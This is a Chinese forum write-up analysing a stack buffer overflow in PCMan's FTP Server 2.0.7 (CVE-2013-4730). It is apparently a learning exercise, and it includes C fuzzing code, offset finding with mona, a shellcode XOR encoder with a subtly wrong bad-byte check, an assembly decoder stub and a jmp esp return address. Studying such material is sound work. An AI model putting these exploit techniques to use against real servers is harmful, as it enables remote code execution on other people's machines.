
# [原创]PCMan's FTP Server 2.0.7（CVE-2013-4730） 个人漏洞分析报告

```
//------------------------------------------------------------

//

//    个人学习二进制漏洞挖掘时写的漏洞报告总结，算作是项目总结

//    研究的类型包括：缓冲区溢出、UAF漏洞、类型混淆

//    包括内容如下：

//    基本的漏洞成因

//    调试工具的使用

//    shellcode(弹框、bindshell)的编写以及改进

//    SEH常识

//    exploit的编写

//    堆喷射

//    ASLR/DEP的基本常识

//    ROP链的构造等

//

//    本来是发到MottoIn上的一些投稿，因为错过了时间，所以发到看雪上接收批评

//    最近在研究渗透以及安卓，驱动也没研究完。。。个人时间比较紧，有空再整理成单独的教程

//------------------------------------------------------------
```

同样一个比较古老的缓冲区溢出漏洞(一个大学生写的软件囧)，当初用来研究bindshell的产物

去掉了一些套路的内容，本次的内容包括：

![](https://bbs.kanxue.com/upload/tmp/734388_awqj3yu3i8gcu5i.png)

----

以下正文：

## PCMan's FTP Server 2.0.7（CVE-2013-4730）

### 漏洞分析报告

|  |  |
| --- | --- |
| **软件名称**：PCMan's FTP Server  **软件版本**：2.0.7  **漏洞模块**：`PCManFTPD2.exe`  **模块版本**：2.0.7  **编译日期**：2013-06-27 | **操作系统**：Windows XP/2003/7/8/10  **漏洞编号**：CVE-2013-4730  **危害等级**：中危  **漏洞类型**：缓冲区溢出  **威胁类型**：远程 |

### 分析工具

|  |
| --- |
| **调试工具**：windbg(`mona`)/Ollydbg/x32dbg  **提取机器码**：010editor  **编译软件**：vs2015  **操作系统**：Windows 10 |

**分析人：**`Red_0range`

2016年12月25日

目录

1． 软件简介... 2
2． 漏洞成因... 2
3． 利用过程... 2
4． POC.. 5
5． 漏洞成因分析... 14
6． 参考资料

# 1. 软件简介

PCMan's FTP Server是简单易于的基础FTP服务器。

![](https://bbs.kanxue.com/upload/attach/201702/734388_bcdvxh3dfkkxgkx.png)

*软件界面*

# 2. 漏洞成因

PCMan's FTP Server 2.0.7在实现上存在缓冲区溢出漏洞，此漏洞源于处理精心构造的USER, PASS, STOR, ABOR, CWD命令时，没有正确验证用户提供的输入，这可使远程攻击者造成缓冲区溢出，导致拒绝服务或执行任意代码。

# 3. 利用过程

## 3.0. 概览

软件`user`命令之后输入过长字符串导致缓冲区溢出跳转到指定代码，执行弹出对话框操作（根据shellcode决定）

![](https://bbs.kanxue.com/upload/attach/201702/734388_wrqci1ri91guva6.png)

*软件漏洞利用示例*

## 3.1. 相关知识说明 //套路，删了

# 4. POC

## 4.1. Fuzz

·运行`windbg`输入指令`!py mona pc 3000`获得字符串文件`pattern.txt`

·复制其中的`char[]`字符串，获得测试溢出码

·编写程序使用”USER”命令发送数据观察`EIP`指向的地址

测试代码如下:

```c
#include "stdafx.h"

#include <WinSock2.h>

#include <Windows.h>

#pragma comment(lib,"Ws2_32.lib")

int main()
{
 // 1. 初始化Winsock服务
 WSADATA stWSA;
 WSAStartup(0x0202, &stWSA);
 // 2. 创建一个原始套接字
 SOCKET stListen = INVALID_SOCKET;
 stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
 // 3. 在任意地址（INADDR_ANY）上绑定一个端口21
 SOCKADDR_IN stService;
 stService.sin_addr.s_addr = inet_addr("127.0.0.1");
 stService.sin_port = htons(21);
 stService.sin_family = AF_INET;
 connect(stListen, (SOCKADDR*)&stService, sizeof(stService));
 // 4. 接受欢迎语
 char szRecv[0x100] = { 0 };
 char *pCommand = "USER anonymous";
 recv(stListen, szRecv, sizeof(szRecv), 0);
 // 5. 发送登陆请求
 char cExploit[5000] = { 0 };                 //Exploit容器
 char *testString =”//string u got from pattern.txt”;
//从pattern得到的字符串，这里请根据个人情况手动修改
 sprintf_s(cExploit, "%s%s", "USER ", testString, "\r\n");
 send(stListen, cExploit, strlen(cExploit), 0);
 recv(stListen, szRecv, sizeof(szRecv), 0);
 // 6. 关闭相关句柄并释放相关资源
 closesocket(stListen);
 WSACleanup();
 return 0;
}
```

根据上图可知，错误地址为`0x6F43386F`

使用`!py mona po 0x6F43386F`指令得到`6F43386F`相对位置为2005

![](https://bbs.kanxue.com/upload/attach/201702/734388_ln3i8kpoxbi7w5s.png)

## 4.2. Shellcode编写

相应的攻击代码使用了`vs2015`的内联汇编，并用了release版进行编译。

**Shellcode编写流程：**

**GetPC硬编码字符串**

**加载通用模块`kernel32.dll`/`kernelbase.dll`**

**在模块导出表获取`LoadLibrary`函数**

**在模块导出表获取`GetProcAddress`函数**

**加载`user32.dll`模块**

**通过`GetProcAddress`获取`MessageBoxA`函数地址**

**通过`GetProcAddress`获取`ExitProcess`函数地址**

**调用`MessageBoxA`**

**调用`ExitProcess`**

### 4.2.1. GetPC

### 4.2.6. 扣取Shellcode&拼接文件

将项目使用release编译，并在起始位置和结尾处进行nop填充方便扣取shellcode

(项目用release编译`main`函数在OD中位于最上方，而debug版编译需要经过两个跳转)

![](https://bbs.kanxue.com/upload/attach/201702/734388_iykvrm8rrb33gix.png)

编译选项设置如图

禁用安全检查确保程序能够正常编译，禁用优化选项确保编译器不会对你的汇编代码进行错误的修改。

![](https://bbs.kanxue.com/upload/attach/201702/734388_m0629cvuxzf3r9p.png)

可以看到`0x0038100c`地址即为我们代码的起始位置

![](https://bbs.kanxue.com/upload/attach/201702/734388_fwzpdetruucx72b.png)

`0x0038110D`为代码的结束位置，选择数据窗口中跟随，在数据窗口中使用`ctrl+shift+c`将机器码到文件中

另外，关于跳板技术——`jmp esp`的介绍：

“`jmp esp`”常被用作跳板动态定位shellcode ，原理如下：

1) 用内存中任意一个”`jmp esp`”的地址覆盖返回地址
2) 函数返回后被重定向去执行内存中`jmp esp`指令
3) 由于函数返回后`ESP`指向返回地址后，`jmp esp`执行后，CPU将到栈区函数返回地址之后的地方取指令执行
4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。`jmp esp`执行完就执行shellcode。

即程序在执行完`jmp esp`之后执行我们的shellcode数据

另外，由于存在字符串截断问题，需要对shellcode继续加密

//这里使用找key算法

```c
bool AutoEncoder(char *pData, int nSize)
{
       // 1. 循环尝试用不同的key加密，直到加密结果不出现0x00
       int             nOutKey = 0x00;
       unsigned char * pBuffer = NULL;
       bool            bComplete = true;
       pBuffer = (unsigned char *)new char[nSize + 1];
       for (int key = 0; key < 0xFF; key++) {
              nOutKey = key;
              bComplete = true;
              for (int i = 0; i < nSize; i++) {
                     pBuffer[i] = pData[i] ^ key;
                     if (0x00 |0x0D|0x0A|0x20== pBuffer[i]) {
                           bComplete = false;
                           break;
                     }
              }
              if (bComplete) break;
       }
       // 2. 判断加密是否成功，不成功则返回false
       if (!bComplete) return false;
       // 3. 将加密后的内容保存在文件中
       FILE * fpOutFile;
       if (EINVAL == fopen_s(&fpOutFile, "encode.txt", "w+"))
              return false;
       // 3.1 输出“/* Encode Key=0xXX */”
       fprintf(fpOutFile, "/* Encode Key=0x%0.2X */\n", nOutKey);
       // 3.2 输出“char bShellcode[] = \”与下一行首部的“"”
       fprintf(fpOutFile, "char bShellcode[] = \\\n\"");
       for (int i = 0; i < nSize; i++) {
              fprintf(fpOutFile, "\\x%0.2X", pBuffer[i]);
              if ((i + 1) % 16 == 0)
                     fprintf(fpOutFile, "\" \\\n\"");
       }
       // 3.3 输出“";”
       fprintf(fpOutFile, "\";");
       // 4. 关闭句柄，释放资源
       fclose(fpOutFile);
       delete[] pBuffer;
       return true;
}
```

在key之前需要有对key的解密操作

```asm
_asm
       {
              xor eax,eax
              call Nexttag-1
              Nexttag:
                     return
                     pop eax
              //decode
              lea esi,[eax+0x1B]   //esi==shellcode
              xor ecx,ecx                //ecx==counter
              mov cx,0x0136        //cx==shellcode体积
              tag_decode:
              mov al,[esi+ecx]
              xor al,0x02
              mov [esi+ecx],al     //al==解密前字节
              loop tag_decode            //al==解密后字节
              xor [esi+ecx],0x02   //将最后一个字节解密，因为ecx为0时loop会停止
              jmp esi                           //跳转到shellcode
       }
```

确保解密代码的机器码中无敏感字节(`0x00`/`0x0A`/`0x0D` etc.)

`Jmp esp`可以在程序运行时的内存中查找，也可以选择操作系统本身，这里提供一个windows中文操作系统通杀地址：

**`0x7ffa4512`**

       这个指令地址可以在`windbg`下使用 `s -w 0x70000000 L0x7ffffff e4ff` 这条指令进行搜索

`e4ff`为`jmp esp`的机器码的倒数

在填充相应字节后使用`"\x5f\xe8\x40\x00"` `jmp esp`跳转

       绑定段口，向窗口发送数据即完成exploit操作

POC示例代码：

![](https://bbs.kanxue.com/upload/attach/201702/734388_gkeyxde9zbebux4.png)

#

# 6. 参考资料

《高端调试》张银奎     著

《0day安全：软件漏洞分析技术（第2版）》 王清       著

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [PCman报告1.pdf](javascript:void(0);)

  （1.02MB，46次下载）
